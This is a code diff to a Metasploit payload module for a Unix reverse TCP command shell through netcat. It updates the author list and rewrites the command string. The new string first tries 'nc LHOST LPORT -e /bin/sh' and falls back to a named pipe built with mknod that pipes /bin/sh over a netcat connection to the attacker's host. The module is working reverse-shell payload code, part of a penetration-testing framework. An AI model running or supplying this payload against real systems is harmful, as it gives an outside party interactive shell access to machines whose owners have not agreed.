@@ -17,16 +17,21 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Reverse TCP (via netcat -e)',
+			'Name'          => 'Unix Command Shell, Reverse TCP (via netcat)',
 			'Description'   => 'Creates an interactive shell via netcat',
-			'Author'        => 'hdm',
+			'Author'        =>
+				[
+					'hdm',     # Original netcat -e payload
+					'm-1-k-3', # netcat payload
+					'egypt'    # Payloads merge
+				],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
 			'Handler'       => Msf::Handler::ReverseTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'netcat-e',
+			'RequiredCmd'   => 'netcat',
 			'Payload'       =>
 				{
 					'Offsets' => { },
@@ -46,7 +51,10 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		"nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh "
+		backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
+		command = "(nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh) ||"
+		command << "(mknod /tmp/#{backpipe} p; nc #{datastore['LHOST']} #{datastore['LPORT']} 0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe})"
+		return command
 	end
 
 end
